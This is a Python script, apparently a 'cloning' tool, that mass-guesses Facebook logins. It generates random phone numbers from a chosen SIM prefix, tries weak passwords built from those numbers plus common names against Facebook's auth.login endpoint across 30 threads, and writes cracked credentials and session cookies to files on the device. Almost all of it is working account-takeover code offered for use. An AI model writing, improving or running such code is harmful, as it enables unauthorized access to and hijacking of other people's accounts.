#WRITTEN BY MR.KHAN
#FOLLOW : https://github.com/MR-KHAN-404
#------------- import -------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
#-------------logo-----------------#
logo=(f'''{B}
"\033[1;31m"|  |/  / |  |  |  |     /   \     |  \ |  | 
"\033[1;33m"|  '  /  |  |__|  |    /  ^  \    |   \|  | 
"\033[1;34m"|    <   |   __   |   /  /_\  \   |  . `  | 
"\033[1;31m"|  .  \  |  |  |  |  /  _____  \  |  |\   | 
"\033[1;33m"|__|\__\ |__|  |__| /__/     \__\ |__| \__| 
{warna}--------------------------------------------{B}
 Owner    : {C}MR.KHAN{B}
 Guthub   : MR-KHAN-404
 Facebook : MINHAJ-KHAN
 Tools Version    : 1{C}/{B}1{C}/{B}1{M} •{warna}[{H}TRAIL{warna}]{warna}
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def MR_KHAN():
    clear()
    os.system('xdg-open https://github.com/MinhajKhanXd/A2.git')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Thanks for using dear :)')
#------------- bd clone def ----------#
def BD_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=50000
    clear()
    for nuber in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as KHAN:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
            KHAN.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_KHAN()
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': '[re:1 10 1000,10008,100083,10000 101 102 103 104 105 106 107 108 109 10;FBOP/1;F 11 110 /110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/ 111 112 112200 112244 112255 113 114 115 116 117 118 119 11/sit 12 120 122 123 124 125 126 127 128 129 130 131 132 133 134 1348564698517390|007c0a9101b9e1c8ffab727666805038 135 136 137 138 139 140 .1.0.28.104;FBPN/com.facebook.katana;FBLC/tr_TR;FBBV/319214973;FBCR/Vodafone;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/ ?1 '}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[PING-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/PING-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[PING-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/PING-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------end----------------#
MR_KHAN()